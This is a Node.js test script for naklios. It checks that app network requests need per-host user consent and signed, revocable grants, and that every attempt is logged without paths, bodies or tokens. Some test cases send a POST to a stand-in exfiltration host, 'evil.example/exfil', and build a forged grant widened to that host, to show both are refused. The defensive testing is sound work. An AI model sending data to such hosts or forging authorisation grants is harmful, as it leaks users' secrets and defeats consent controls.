// S1 (2026-09-24): naklios.net.fetch is Grant-gated and History-logged, as docs/app-contract.md says.
// Runs the REAL egress-authority block extracted from index.html against the real sys/identity/grant.mjs
// and sys/history/ledger.mjs, with stubbed localStorage, consent dialog, OPFS and backend fetch:
// one consent per (app, host); a decline is remembered and refuses without touching the backend; a
// revoked or tampered grant does not verify; every attempt — refusals included — appends one
// hash-chained History line with host/method/status/bytes and never the URL path, a body or a token.
//   node scripts/test-host-egress-authority.mjs
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { pathToFileURL } from 'node:url';
import { verifyChain } from '../sys/history/ledger.mjs';

const host = await readFile(new URL('../index.html', import.meta.url), 'utf8');
const start = host.indexOf('const NET_GRANTS_KEY');
const end = host.indexOf('async function egressFetch(');
assert.ok(start > 0 && end > start, 'the egress-authority block is in index.html, before egressFetch');
const root = pathToFileURL(new URL('..', import.meta.url).pathname).href;
const block = host.slice(start, end).replaceAll("import('./sys/", `import('${root}sys/`);

// the wiring: the handler goes through the enforcement point, after the system-app and backend checks
const h = host.slice(host.indexOf("} else if (msg.type === 'naklios:net:fetch'){"), host.indexOf("} else if (typeof msg.type === 'string' && msg.type.startsWith('naklios:fs:')){"));
assert.match(h, /if \(!aiAppIsSystem\(appId\)\) throw[\s\S]*if \(!egressConfigured\(\)\)[\s\S]*reply\.result = await netHostFetch\(appId, msg\);/, 'net:fetch → system app → backend → netHostFetch');
assert.doesNotMatch(h, /await egressFetch\(/, 'the handler never calls the backend around the grant');
assert.match(host, /id="net-revoke-grants"[\s\S]{0,400}Reset network decisions/, 'Settings offers revocation');

function load({ answers = [] } = {}) {
  const ls = new Map(); const prompts = []; const fetched = [];
  let fileText = '';
  const fileHandle = {
    getFile: async () => ({ size: fileText.length, text: async () => fileText }),
    createWritable: async ({ keepExistingData } = {}) => {
      let buf = keepExistingData ? fileText : '';
      return { write: async ({ position, data }) => { buf = buf.slice(0, position) + data; }, close: async () => { fileText = buf; } };
    },
  };
  const dir = { getDirectoryHandle: async () => dir, getFileHandle: async () => fileHandle };
  const env = {
    localStorage: { getItem: (k) => (ls.has(k) ? ls.get(k) : null), setItem: (k, v) => ls.set(k, String(v)) },
    APPS: [{ id: 'anvil', name: 'Anvil' }],
    nakliosConfirm: async (msg) => { prompts.push(msg); return answers.length ? answers.shift() : true; },
    navigator: { storage: { getDirectory: async () => dir } },
    egressFetch: async (req) => { fetched.push(req); return { status: 200, statusText: 'OK', headers: {}, body: 'x'.repeat(42) }; },
    console,
  };
  const names = Object.keys(env);
  const api = new Function(...names, `${block}\nreturn { netHostFetch, revokeNetGrants, netGrants, netGrantCount, netAuthorize, saveNetGrants, NET_GRANTS_KEY };`)(...names.map((k) => env[k]));
  return { api, prompts, fetched, ls, lines: () => fileText.split('\n').filter(Boolean).map((l) => JSON.parse(l)) };
}
const req = (url, extra = {}) => ({ url, method: 'POST', headers: { Authorization: 'Bearer SECRET-TOKEN' }, body: 'BODY-PAYLOAD', ...extra });
async function rejects(p) { try { await p; return null; } catch (e) { return e; } }

// 1. First request to a host: one consent, a grant, the fetch, one History line.
{
  const t = load();
  const r = await t.api.netHostFetch('anvil', req('https://github.com/owner/private-repo.git/git-receive-pack'));
  assert.equal(r.status, 200);
  assert.equal(t.prompts.length, 1, 'asked once'); assert.match(t.prompts[0], /Anvil wants to send requests to github\.com/);
  assert.equal(t.fetched.length, 1, 'fetched once');
  const g = t.api.netGrants().anvil['github.com'];
  assert.ok(g && g.identifier && g.sig, 'a signed grant is stored');
  assert.deepEqual(g.caveats.map((c) => c.type + ':' + JSON.stringify(c.value)), ['principal:"app:anvil"', 'tools:["net.fetch"]', 'scope:"net:github.com"']);
  // 2. The same host again: no prompt; a second host: one more prompt.
  await t.api.netHostFetch('anvil', req('https://github.com/x'));
  assert.equal(t.prompts.length, 1, 'a granted host is not asked again');
  await t.api.netHostFetch('anvil', req('https://gitlab.com/x', { method: 'GET' }));
  assert.equal(t.prompts.length, 2, 'a new host is asked');
  assert.equal(t.api.netGrantCount(), 2);
  // History: three lines, a verified chain, host/method/status/bytes — never the path, body or token.
  const lines = t.lines();
  assert.equal(lines.length, 3);
  assert.deepEqual(lines[0].input, { host: 'github.com', method: 'POST' });
  assert.deepEqual(lines[0].output, { status: 200, bytes: 42 });
  assert.equal(lines[0].door, 'net'); assert.equal(lines[0].tool, 'net.fetch'); assert.equal(lines[0].principal, 'app:anvil');
  assert.equal(lines[0].grant_id, g.identifier, 'the line names the grant it ran under');
  assert.equal((await verifyChain(lines)).ok, true, 'the History lines form a verified hash chain');
  const raw = JSON.stringify(lines);
  for (const secret of ['private-repo', 'git-receive-pack', 'BODY-PAYLOAD', 'SECRET-TOKEN']) assert.ok(!raw.includes(secret), `History never carries "${secret}"`);
  // 3. Concurrent first requests to a new host share one prompt.
  const t2 = load();
  await Promise.all([t2.api.netHostFetch('anvil', req('https://a.example/1')), t2.api.netHostFetch('anvil', req('https://a.example/2'))]);
  assert.equal(t2.prompts.length, 1, 'two racing first requests ask once');
}

// 4. A decline refuses without touching the backend, is remembered, and is logged.
{
  const t = load({ answers: [false] });
  const e = await rejects(t.api.netHostFetch('anvil', req('https://evil.example/exfil')));
  assert.ok(e && /not allowed/.test(e.message) && e.code === 'ENOGRANT', 'refused with ENOGRANT');
  assert.equal(t.fetched.length, 0, 'the backend was never called');
  await rejects(t.api.netHostFetch('anvil', req('https://evil.example/again')));
  assert.equal(t.prompts.length, 1, 'the decline is remembered — no prompt loop from an agent retrying');
  const lines = t.lines();
  assert.equal(lines.length, 2, 'each refused attempt is on the record');
  assert.match(lines[0].output.refused, /not allowed/); assert.equal(lines[0].grant_id, null);
  assert.equal((await verifyChain(lines)).ok, true);
}

// 5. Revocation: the old grant stops verifying, and the next request asks again.
{
  const t = load();
  await t.api.netHostFetch('anvil', req('https://github.com/x'));
  const old = t.api.netGrants().anvil['github.com'];
  t.api.revokeNetGrants();
  assert.equal(t.api.netGrantCount(), 0);
  // a stale copy of the revoked grant (restored from a backup, say) must not verify
  t.api.saveNetGrants({ anvil: { 'github.com': old } });
  const e = await rejects(t.api.netHostFetch('anvil', req('https://github.com/x')));
  assert.ok(e && /did not verify \(revoked\)/.test(e.message), 'a revoked grant is refused: ' + (e && e.message));
  assert.equal(t.fetched.length, 1, 'no fetch under the revoked grant');
  t.api.saveNetGrants({});
  await t.api.netHostFetch('anvil', req('https://github.com/x'));
  assert.equal(t.prompts.length, 2, 'after revocation the owner is asked again');
}

// 6. A grant edited to widen its scope fails the signature.
{
  const t = load();
  await t.api.netHostFetch('anvil', req('https://github.com/x'));
  const g = t.api.netGrants().anvil['github.com'];
  const forged = { ...g, caveats: g.caveats.map((c) => (c.type === 'scope' ? { ...c, value: 'net:evil.example' } : c)) };
  t.api.saveNetGrants({ anvil: { 'github.com': g, 'evil.example': forged } });
  const e = await rejects(t.api.netHostFetch('anvil', req('https://evil.example/x')));
  assert.ok(e && /did not verify \(signature\)/.test(e.message), 'a widened grant fails the signature: ' + (e && e.message));
  // and a grant for one host never serves another
  const v = await t.api.netAuthorize('anvil', 'github.com');
  assert.equal(v.ok, true);
}

// 7. A bad URL is EINVAL before anything is asked.
{
  const t = load();
  const e = await rejects(t.api.netHostFetch('anvil', req('not a url')));
  assert.ok(e && e.code === 'EINVAL'); assert.equal(t.prompts.length, 0);
}

console.log('host-egress-authority: one consent per (app, host), a remembered decline, revocation and forgery refused, every attempt on a verified History chain with no path, body or token');
